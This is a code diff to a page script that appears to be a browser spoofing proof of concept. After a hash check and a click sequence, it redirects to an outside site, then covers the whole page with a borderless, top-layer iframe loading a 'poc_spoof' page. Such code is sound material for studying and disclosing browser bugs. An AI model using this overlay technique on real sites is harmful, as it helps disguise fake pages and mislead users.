@@ -76,52 +76,10 @@
 <script>
 if (location.hash === '#x') {
 
-  // ===== SAFE WRITE FUNCTION WITH FALLBACK =====
-  function safeWrite() {
-
-    // Method 1: document.write
-    try {
-      document.open();
-      document.write("<h1>hei</h1>");
-      document.close();
-      return;
-    } catch (e) {
-      console.log("Method 1 failed:", e);
-    }
-
-    // Method 2: innerHTML
-    try {
-      document.body.innerHTML = "<h1>hei</h1>";
-      return;
-    } catch (e) {
-      console.log("Method 2 failed:", e);
-    }
-
-    // Method 3: DOM createElement
-    try {
-      document.body.innerHTML = "";
-      var h1 = document.createElement("h1");
-      h1.textContent = "hei";
-      document.body.appendChild(h1);
-      return;
-    } catch (e) {
-      console.log("Method 3 failed:", e);
-    }
-
-    // Method 4: outerHTML (last fallback)
-    try {
-      document.documentElement.outerHTML =
-        "<!DOCTYPE html><html><body><h1>hei</h1></body></html>";
-      return;
-    } catch (e) {
-      alert("All write methods failed.");
-    }
-  }
-
-  // If second click flag exists → write immediately
-  if (sessionStorage.getItem("secondClick") === "1") {
-    sessionStorage.removeItem("secondClick");
-    safeWrite();
+  // If redirected for iframe
+  if (sessionStorage.getItem("showIframe") === "1") {
+    sessionStorage.removeItem("showIframe");
+    showIframe();
   }
 
   function renderMain() {
@@ -140,9 +98,9 @@ if (location.hash === '#x') {
 
     if (sessionStorage.getItem("clickedOnce") === "1") {
 
-      // Second click → reload same page then write
-      sessionStorage.setItem("secondClick", "1");
-      location.reload();
+      // Second click → mark and redirect (reload same page)
+      sessionStorage.setItem("showIframe", "1");
+      location.replace(location.href);
 
     } else {
 
@@ -151,6 +109,23 @@ if (location.hash === '#x') {
       window.location.href = "https://test.com.pwr.wtf/public_html/slaw.html";
 
     }
+  }
+
+  function showIframe() {
+
+    document.body.innerHTML = "";
+
+    var iframe = document.createElement("iframe");
+    iframe.src = "https://lowleveljody.github.io/pocbrowseraja/poc_spoof.html#x";
+    iframe.style.position = "fixed";
+    iframe.style.top = "0";
+    iframe.style.left = "0";
+    iframe.style.width = "9999px";
+    iframe.style.height = "9999px";
+    iframe.style.border = "none";
+    iframe.style.zIndex = "9999";
+
+    document.body.appendChild(iframe);
   }
 
   renderMain();
